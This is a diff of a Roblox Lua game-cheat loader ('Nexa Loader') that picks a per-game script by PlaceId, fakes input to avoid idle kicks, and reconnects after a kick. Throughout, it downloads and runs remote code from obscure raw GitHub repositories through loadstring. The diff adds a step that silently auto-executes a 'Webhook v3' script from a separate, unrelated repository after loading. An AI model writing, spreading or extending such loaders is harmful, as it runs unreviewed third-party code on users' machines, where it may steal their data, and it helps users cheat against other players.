@@ -1,8 +1,7 @@
-
 local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/fhffgufGUIPRIVat"))()
 
---[[
+--[[ 
  _   _ _______ __   __    _    
 | \ | |  ____|  \ /  |  / \   
 |  \| | |__     \ V /  / _ \  
@@ -11,41 +10,39 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh
 |_| \_|______| /_/ \_/_/     \_\
 ]]
 
--- Tunggu player siap
+-- Tunggu sampai game siap
 repeat task.wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
+if not game:IsLoaded() then game.Loaded:Wait() end
 
 print("Supported loader system running...")
 
 local placeId = game.PlaceId
 
--- Table games dengan multiple PlaceId
+-- Daftar game dan script URL
 local games = {
     ["FishIt"] = {
-        placeIds = {121864768012064}, -- bisa tambah PlaceId tambahan
-        url = 'https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/sjfeufeufegfefy'
+        placeIds = {121864768012064},
+        url = "https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/sjfeufeufegfefy"
     },
     ["Prospecting"] = {
         placeIds = {129827112113663},
-        url = 'https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/ewfheufefgeufg'
+        url = "https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/ewfheufefgeufg"
     },
     ["PlantVsBrainrot"] = {
         placeIds = {127742093697776},
-        url = 'https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/wfnwefjwewidjeuf'
+        url = "https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/wfnwefjwewidjeuf"
     },
     ["99 Nights"] = {
         placeIds = {126509999114328},
-        url = 'https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/fwfewfefef99%20Nig'
+        url = "https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/fwfewfefef99%20Nig"
     },
     ["Fisch"] = {
         placeIds = {16732694052, 131716211654599},
-        url = 'https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/wjdgydfwydwyFISCH'
+        url = "https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/wjdgydfwydwyFISCH"
     }
 }
 
--- Cari skrip sesuai PlaceId
+-- Cari script sesuai PlaceId
 local scriptUrl
 for _, gameInfo in pairs(games) do
     if table.find(gameInfo.placeIds, placeId) then
@@ -54,14 +51,13 @@ for _, gameInfo in pairs(games) do
     end
 end
 
--- Fungsi notifikasi WindUI dengan fallback
+-- Notifikasi WindUI
 local function NotifyWindUI(title, content, duration)
-    local success, WindUI = pcall(function()
+    local success, UI = pcall(function()
         return getgenv().WindUI or WindUI
     end)
-
-    if success and WindUI and WindUI.Notify then
-        WindUI:Notify({
+    if success and UI and UI.Notify then
+        UI:Notify({
             Title = title or "Notification",
             Content = content or "",
             Duration = duration or 5,
@@ -76,7 +72,7 @@ local function NotifyWindUI(title, content, duration)
     end
 end
 
--- Jalankan skrip game jika ditemukan
+-- Jalankan script utama
 if scriptUrl then
     local success, err = pcall(function()
         loadstring(game:HttpGet(scriptUrl))()
@@ -84,6 +80,20 @@ if scriptUrl then
 
     if success then
         NotifyWindUI("Nexa Loader", "Script loaded successfully!", 5)
+        
+        -- ✅ Tambahkan di sini: auto eksekusi Webhook V3
+        task.delay(2, function()
+            local webhookUrl = "https://raw.githubusercontent.com/hdgsydgdgdy1233/Loaderlua/refs/heads/main/Webhook%20v3"
+            local ok, err2 = pcall(function()
+                loadstring(game:HttpGet(webhookUrl))()
+            end)
+            if ok then
+                NotifyWindUI("Webhook", "Webhook v3 executed successfully!", 4)
+            else
+                NotifyWindUI("Webhook", "Failed to execute Webhook v3:\n" .. tostring(err2), 6)
+            end
+        end)
+
     else
         NotifyWindUI("Nexa Loader", "Failed to load script:\n" .. tostring(err), 8)
         warn("Failed to load script:", err)
@@ -94,16 +104,13 @@ else
 end
 
 -- =======================
--- AntiAFK Safe Auto-ON
+-- Anti AFK Auto On
 -- =======================
 local Players = game:GetService("Players")
 local VirtualUser = game:GetService("VirtualUser")
 local player = Players.LocalPlayer
 
 local AntiAFKEnabled = true
-local AntiAFKConnection
-local loopThread
-
 local function doVirtualAction()
     VirtualUser:CaptureController()
     VirtualUser:ClickButton2(Vector2.new(math.random(0,800), math.random(0,600)))
@@ -111,45 +118,30 @@ local function doVirtualAction()
     VirtualUser:ClickButton2(Vector2.new(math.random(0,800), math.random(0,600)))
 end
 
-local function startLoop()
-    loopThread = coroutine.create(function()
-        while AntiAFKEnabled do
-            pcall(doVirtualAction)
-            local waitTime = math.random(60, 300) -- interval acak 1-5 menit
-            local elapsed = 0
-            while elapsed < waitTime and AntiAFKEnabled do
-                task.wait(1)
-                elapsed += 1
-            end
-        end
-    end)
-    coroutine.resume(loopThread)
-end
-
-AntiAFKConnection = player.Idled:Connect(function()
+player.Idled:Connect(function()
     if AntiAFKEnabled then
         pcall(doVirtualAction)
     end
 end)
 
-startLoop()
+coroutine.wrap(function()
+    while AntiAFKEnabled do
+        pcall(doVirtualAction)
+        task.wait(math.random(60, 300))
+    end
+end)()
 
-
+-- =======================
+-- Auto Reconnect
+-- =======================
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Gato290/Script/refs/heads/main/ha"))()
 
-local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local RunService = game:GetService("RunService")
-local player = Players.LocalPlayer
-
--- Simpan PlaceId dan JobId server saat ini
 local placeId = game.PlaceId
 local jobId = game.JobId
-
--- Delay sebelum mencoba reconnect (detik)
 local RECONNECT_DELAY = 5
 
--- Fungsi reconnect
 local function reconnect()
     print("Mencoba reconnect ke server yang sama...")
     pcall(function()
@@ -157,39 +149,22 @@ local function reconnect()
     end)
 end
 
--- Detect kicked event
 player.OnKick = function(reason)
-    print("Kicked dari server! Alasan: " .. tostring(reason))
-    wait(RECONNECT_DELAY)
+    print("Kicked dari server! Alasan:", tostring(reason))
+    task.wait(RECONNECT_DELAY)
     reconnect()
 end
 
--- Detect disconnection/crash menggunakan Heartbeat
-local function detectDisconnect()
-    local lastTime = tick()
-    RunService.Heartbeat:Connect(function()
-        lastTime = tick()
-    end)
-end
+RunService.Heartbeat:Connect(function() end)
 
--- Fungsi utama: Auto reconnect
-local function autoReconnect()
-    -- Jika DC karena koneksi lost
-    local success, result = pcall(function()
-        while true do
-            if not player.Parent then
-                print("Player disconnected, mencoba reconnect...")
-                wait(RECONNECT_DELAY)
-                reconnect()
-                break
-            end
-            wait(1)
+coroutine.wrap(function()
+    while true do
+        if not player.Parent then
+            print("Player disconnected, mencoba reconnect...")
+            task.wait(RECONNECT_DELAY)
+            reconnect()
+            break
         end
-    end)
-    if not success then
-        warn("Error autoReconnect: " .. tostring(result))
+        task.wait(1)
     end
-end
-
--- Jalankan auto reconnect
-autoReconnect()
+end)()
